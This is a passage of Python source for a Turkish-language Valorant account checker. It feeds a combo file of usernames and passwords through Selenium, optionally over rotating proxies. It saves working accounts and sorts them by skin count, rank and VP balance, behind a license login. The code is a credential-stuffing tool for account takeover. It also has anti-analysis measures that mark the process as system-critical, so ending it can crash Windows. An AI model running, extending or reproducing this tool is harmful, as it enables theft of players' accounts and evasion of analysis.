                # Protection check before processing proxy
                protection._check_processes()
                
                proxy = proxy_queue.get_nowait()
            except queue.Empty:
                break
            
            if check_proxy(proxy):
                with lock:
                    print(f"{Fore.GREEN}[✔] Geçerli → {proxy}")
                    good_proxies.append(proxy)
            else:
                with lock:
                    print(f"{Fore.RED}[✘] Hatalı → {proxy}")
            
            with lock:
                progress_bar.update(1)
            proxy_queue.task_done()

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=thread_worker)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()
    
    progress_bar.close()

    checked_path = os.path.join(BASE_DIR, "proxies", "checked_proxies.txt")
    with open(checked_path, "w", encoding="utf-8") as f:
        for p in good_proxies:
            f.write(p + "\n")

    print(f"\n{Fore.GREEN}{Style.BRIGHT}✅ {len(good_proxies)} geçerli proxy kaydedildi: checked_proxies.txt{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}📊 Başarı oranı: %{(len(good_proxies)/len(proxies)*100):.1f}")

def auth_menu():
    """Yetkilendirme menüsü"""
    auth = KeyAuthLogin()
    
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print_ascii_banner()
        
        print(f"\n{Fore.CYAN}{Style.BRIGHT}╔════════════════════════════════════════════════════════╗")
        print(f"║                      YETKİLENDİRME                     ║")
        print(f"╚════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{Style.BRIGHT}  [1] 🔐 Giriş Yap")
        print(f"{Fore.BLUE}{Style.BRIGHT}  [2] 📝 Kayıt Ol")
        print(f"{Fore.RED}{Style.BRIGHT}  [0] 🚪 Çıkış")
        print(f"{Fore.CYAN}{'═' * 60}")
        
        choice = input(f"{Fore.YELLOW}{Style.BRIGHT}👉 Seçiminiz: {Fore.RESET}").strip()
        
        if choice == "1":
            if auth.login():
                return True
        elif choice == "2":
            if auth.register():
                continue
        elif choice == "0":
            print(f"{Fore.RED}{Style.BRIGHT}👋 Çıkış yapılıyor...{Style.RESET_ALL}")
            return False
        else:
            print(f"{Fore.RED}❌ Geçersiz seçim!")
            time.sleep(1)

def main_menu():
    """Ana menü"""
    print(f"\n{Fore.CYAN}{Style.BRIGHT}╔════════════════════════════════════════════════════════╗")
    print(f"║                    ANA MENÜ                            ║")
    print(f"╚════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{Style.BRIGHT}  [1] 🌐 Proxy ile Selenium Valorant kontrol et")
    print(f"{Fore.GREEN}{Style.BRIGHT}  [2] 🔒 Proxy olmadan Selenium Valorant kontrol et")
    print(f"{Fore.BLUE}{Style.BRIGHT}  [3] 🔍 Proxy checker çalıştır")
    print(f"{Fore.MAGENTA}{Style.BRIGHT}  [4] 📊 Sonuçları görüntüle")
    print(f"{Fore.YELLOW}{Style.BRIGHT}  [5] ⚙️  Ayarlar")
    print(f"{Fore.RED}{Style.BRIGHT}  [0] 🚪 Çıkış")
    print(f"{Fore.CYAN}{'═' * 60}")
    return input(f"{Fore.YELLOW}{Style.BRIGHT}👉 Seçiminiz: {Fore.RESET}")

def show_results():
    """Sonuçları göster"""
    valorant_dir = os.path.join(BASE_DIR, "valorant")
    
    print(f"\n{Fore.CYAN}{Style.BRIGHT}╔════════════════════════════════════════════════════════╗")
    print(f"║                      SONUÇLAR                          ║")
    print(f"╚════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    # Ana hits
    hits_file = os.path.join(valorant_dir, "hits.txt")
    hits_proxy_file = os.path.join(valorant_dir, "hits_proxy.txt")
    
    total_hits = 0
    if os.path.exists(hits_file):
        with open(hits_file, "r") as f:
            hits_count = len([line for line in f if line.strip()])
        total_hits += hits_count
        print(f"{Fore.GREEN}🎯 Normal Hit: {hits_count}")
    
    if os.path.exists(hits_proxy_file):
        with open(hits_proxy_file, "r") as f:
            hits_proxy_count = len([line for line in f if line.strip()])
        total_hits += hits_proxy_count
        print(f"{Fore.GREEN}🌐 Proxy Hit: {hits_proxy_count}")
    
    print(f"{Fore.GREEN}{Style.BRIGHT}📈 Toplam Hit: {total_hits}")
    
    # Skin grupları
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}🎨 Skin Grupları:")
    skin_groups = {
        "1-10_skins": "1-10 Skin",
        "11-20_skins": "11-20 Skin", 
        "21-30_skins": "21-30 Skin",
        "31-50_skins": "31-50 Skin",
        "51+_skins": "51+ Skin"
    }
    
    for group, display_name in skin_groups.items():
        file_path = os.path.join(valorant_dir, "skin_groups", group, "accounts.txt")
        if os.path.exists(file_path):
            with open(file_path, "r") as f:
                count = len([line for line in f if line.strip()])
            if count > 0:
                print(f"{Fore.CYAN}  {display_name}: {count} hesap")
    
    # Rank grupları
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}🏆 Rank Grupları:")
    rank_groups = {
        "unranked": "🔘 Unranked",
        "iron": "🥉 Iron",
        "bronze": "🥉 Bronze", 
        "silver": "🥈 Silver",
        "gold": "🥇 Gold",
        "platinum": "💎 Platinum",
        "diamond": "💎 Diamond",
        "ascendant": "⭐ Ascendant",
        "immortal": "🔥 Immortal",
        "radiant": "👑 Radiant"
    }
    
    for group, display_name in rank_groups.items():
        file_path = os.path.join(valorant_dir, "rank_groups", group, "accounts.txt")
        if os.path.exists(file_path):
            with open(file_path, "r") as f:
                count = len([line for line in f if line.strip()])
            if count > 0:
                print(f"{Fore.CYAN}  {display_name}: {count} hesap")
    
    # Yüksek VP
    high_vp_file = os.path.join(valorant_dir, "high_vp", "accounts.txt")
    if os.path.exists(high_vp_file):
        with open(high_vp_file, "r") as f:
            vp_count = len([line for line in f if line.strip()])
        if vp_count > 0:
            print(f"\n{Fore.MAGENTA}{Style.BRIGHT}💎 1000+ VP Hesapları: {vp_count}")

def settings_menu():
    """Ayarlar menüsü"""
    print(f"\n{Fore.CYAN}{Style.BRIGHT}╔════════════════════════════════════════════════════════╗")
    print(f"║                       AYARLAR                          ║")
    print(f"╚════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}📁 Script Klasörü: {BASE_DIR}")
    print(f"{Fore.YELLOW}🔗 Proxy Dosyası: {PROXY_FILE}")
    print(f"{Fore.YELLOW}📝 Combo Dosyası: {os.path.join(BASE_DIR, 'valorant', 'combo.txt')}")
    
    print(f"\n{Fore.GREEN}{Style.BRIGHT}  [1] 📂 Klasörleri yeniden oluştur")
    print(f"{Fore.BLUE}{Style.BRIGHT}  [2] 🧹 Sonuçları temizle")
    print(f"{Fore.MAGENTA}{Style.BRIGHT}  [3] 🛠️  Chrome WebDriver kontrol et")
    print(f"{Fore.RED}{Style.BRIGHT}  [0] ↩️  Geri dön")
    
    choice = input(f"\n{Fore.YELLOW}👉 Seçiminiz: {Fore.RESET}")
    
    if choice == "1":
        setup_directories()
        print(f"{Fore.GREEN}✅ Klasörler yeniden oluşturuldu!")
    elif choice == "2":
        confirm = input(f"{Fore.RED}⚠️  Tüm sonuçları silmek istediğinizden emin misiniz? (y/N): {Fore.RESET}")
        if confirm.lower() == 'y':
            # Clear all result files
            valorant_dir = os.path.join(BASE_DIR, "valorant")
            result_files = [
                "hits.txt", "hits_proxy.txt"
            ]
            
            for file_name in result_files:
                file_path = os.path.join(valorant_dir, file_name)
                if os.path.exists(file_path):
                    open(file_path, 'w').close()
            
            # Clear category folders
            categories = [
                "skin_groups/1-10_skins", "skin_groups/11-20_skins", "skin_groups/21-30_skins", 
                "skin_groups/31-50_skins", "skin_groups/51+_skins",
                "rank_groups/unranked", "rank_groups/iron", "rank_groups/bronze", "rank_groups/silver", 
                "rank_groups/gold", "rank_groups/platinum", "rank_groups/diamond", 
                "rank_groups/ascendant", "rank_groups/immortal", "rank_groups/radiant",
                "high_vp", "detailed_accounts"
            ]
            
            for category in categories:
                file_path = os.path.join(valorant_dir, category, "accounts.txt")
                if os.path.exists(file_path):
                    open(file_path, 'w').close()
            
            print(f"{Fore.GREEN}✅ Tüm sonuçlar temizlendi!")
        else:
            print(f"{Fore.YELLOW}❌ İşlem iptal edildi.")
    elif choice == "3":
        print(f"{Fore.CYAN}🔍 Chrome WebDriver kontrol ediliyor...")
        try:
            checker = ValorantSeleniumChecker(headless=True)
            if checker.setup_driver():
                print(f"{Fore.GREEN}✅ Chrome WebDriver çalışıyor!")
                checker.close_driver()
            else:
                print(f"{Fore.RED}❌ Chrome WebDriver sorunu var!")
                print(f"{Fore.YELLOW}ℹ️  Chrome browser yüklü olduğundan emin olun")
                print(f"{Fore.YELLOW}ℹ️  pip install webdriver-manager selenium komutu çalıştırın")
        except Exception as e:
            print(f"{Fore.RED}❌ WebDriver hatası: {e}")

def check_requirements():
    """Gerekli kütüphaneleri kontrol et"""
    required_packages = {
        'selenium': 'selenium',
        'webdriver_manager': 'webdriver-manager',
        'requests': 'requests',
        'colorama': 'colorama',
        'tqdm': 'tqdm'
    }
    
    missing_packages = []
    
    for package, pip_name in required_packages.items():
        try:
            __import__(package)
        except ImportError:
            missing_packages.append(pip_name)
    
    if missing_packages:
        print(f"{Fore.RED}❌ Eksik kütüphaneler bulundu:{Fore.RESET}")
        for package in missing_packages:
            print(f"{Fore.YELLOW}   - {package}{Fore.RESET}")
        print(f"\n{Fore.CYAN}📦 Yüklemek için şu komutu çalıştırın:{Fore.RESET}")
        print(f"{Fore.GREEN}pip install {' '.join(missing_packages)}{Fore.RESET}")
        return False
    
    return True

def anti_dump_measures():
    """Additional anti-dump measures"""
    try:
        if os.name == 'nt':
            kernel32 = ctypes.windll.kernel32
            
            # Set process critical flag
            ntdll = ctypes.windll.ntdll
            ntdll.RtlSetProcessIsCritical(1, 0, 0)
            
            # Hide from debugger
            kernel32.SetHandleInformation(
                kernel32.GetCurrentProcess(), 
                1,  # HANDLE_FLAG_PROTECT_FROM_CLOSE
                1
            )
            
    except:
        pass

if __name__ == "__main__":
    # Initialize anti-dump measures
    anti_dump_measures()
    
    # Gerekli kütüphaneler kontrolü
    if not check_requirements():
        input(f"{Fore.RED}Gerekli kütüphaneleri yükledikten sonra programı tekrar çalıştırın...{Fore.RESET}")
        exit(1)
    
    # Import kontrolleri
    try:
        from selenium import webdriver
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        from selenium.webdriver.chrome.options import Options
        from webdriver_manager.chrome import ChromeDriverManager
    except ImportError as e:
        print(f"{Fore.RED}❌ Import hatası: {e}")
        print(f"{Fore.YELLOW}📦 Eksik kütüphaneyi yüklemek için: pip install selenium webdriver-manager")
        exit(1)
    
    loading_animation()
    setup_directories()
    
    # Chrome browser kontrol et
    try:
        print(f"{Fore.CYAN}🔍 Chrome browser kontrol ediliyor...{Fore.RESET}")
        temp_checker = ValorantSeleniumChecker(headless=True)
        if temp_checker.setup_driver():
            print(f"{Fore.GREEN}✅ Chrome WebDriver hazır!{Fore.RESET}")
            temp_checker.close_driver()
        else:
            print(f"{Fore.YELLOW}⚠️  WebDriver ile sorun olabilir, ama devam ediliyor...{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.YELLOW}⚠️  WebDriver ön kontrol hatası: {e}{Fore.RESET}")
        print(f"{Fore.CYAN}ℹ️  Program çalışmaya devam ediyor...{Fore.RESET}")
    
    # Auth kontrolü
    if not auth_menu():
        exit()
    
    # Ana program döngüsü
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print_ascii_banner()
        
        choice = main_menu()
        
        if choice == "0":
            print(f"{Fore.RED}{Style.BRIGHT}👋 Çıkış yapılıyor...{Style.RESET_ALL}")
            time.sleep(1)
            break
        elif choice == "3":
            try:
                thread_count = int(input(f"{Fore.CYAN}🧵 Kaç thread ile proxy test edilsin? (varsayılan 10): {Fore.RESET}") or "10")
                if thread_count < 1:
                    thread_count = 10
            except:
                thread_count = 10
            proxy_checker(thread_count)
            input(f"{Fore.MAGENTA}📱 Devam etmek için ENTER tuşuna basın...{Fore.RESET}")
        elif choice == "4":
            show_results()
            input(f"{Fore.MAGENTA}📱 Devam etmek için ENTER tuşuna basın...{Fore.RESET}")
        elif choice == "5":
            settings_menu()
            input(f"{Fore.MAGENTA}📱 Devam etmek için ENTER tuşuna basın...{Fore.RESET}")
        elif choice in ["1", "2"]:
            proxy_mode = choice == "1"
            
            # Thread sayısı
            try:
                num_threads = int(input(f"{Fore.CYAN}🧵 Kaç thread kullanılacak? (varsayılan 2, max 3 önerilir - Selenium yavaş): {Fore.RESET}") or "2")
                if num_threads < 1:
                    num_threads = 2
                elif num_threads > 5:
                    print(f"{Fore.YELLOW}⚠️  Çok fazla thread sistem yavaşlatabilir. 3 ile sınırlandırıldı.{Fore.RESET}")
                    num_threads = 3
            except:
                num_threads = 2
            
            # Headless modu
            headless_choice = input(f"{Fore.CYAN}👻 Headless mod kullanılsın mı? (Y/n - Evet önerilir): {Fore.RESET}").strip().lower()
            headless_mode = headless_choice != 'n'
            
            start_valorant_check(proxy_mode, num_threads, headless_mode)
            input(f"{Fore.MAGENTA}📱 Kontrol tamamlandı. Devam etmek için ENTER tuşuna basın...{Fore.RESET}")
        else:
            print(f"{Fore.RED}❌ Geçersiz seçim!")
            time.sleep(1)